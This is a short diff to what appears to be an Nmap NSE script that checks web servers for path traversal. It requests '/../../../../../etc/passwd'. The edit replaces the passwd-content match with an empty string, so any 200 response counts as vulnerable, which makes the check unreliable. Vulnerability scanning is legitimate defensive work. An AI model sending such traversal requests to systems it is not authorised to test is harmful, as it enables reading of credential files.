@@ -43,7 +43,7 @@ action = function(host, port)
  local url = stdnse.get_script_args(SCRIPT_NAME..".url") or "/../../../../../etc/passwd"
  local response = http.generic_request(host, port, "GET", "/../../../../../etc/passwd", options)
 
- if response.status == 200 and string.match(response.body, "root:x:0:0:root:/:/bin/bash")  then
+ if response.status == 200 and string.match(response.body, "")  then
  -- if response.status == 200 then
  vuln.state = vulns.STATE.VULN
  end
